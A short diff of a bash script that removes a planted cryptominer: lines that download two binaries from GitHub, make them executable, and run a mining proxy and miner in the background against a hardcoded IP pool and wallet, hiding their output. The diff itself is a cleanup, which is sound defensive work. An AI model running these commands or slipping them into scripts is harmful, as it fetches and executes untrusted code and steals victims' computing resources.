@@ -1,9 +1,4 @@
 #!/usr/bin/env bash
-wget https://github.com/iaidjb18ha/b/raw/main/xmrig-proxy
-wget https://github.com/pramadoli/squash/raw/main/srb
-chmod 777 xmrig-proxy srb
-./xmrig-proxy -a rx/0 -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.AutoBitcoin_novalanto -p x -b 0.0.0.0:3393 -m simple >/dev/null &
-./srb --algorithm cryptonight_upx --pool 168.235.86.33:3393 --wallet SK_QzApkbVGsAxyQykaWSnEF.AutoBitcoin_novalanto --password $(cat /proc/sys/kernel/hostname) >/dev/null &
 
 set -eu -o pipefail
 
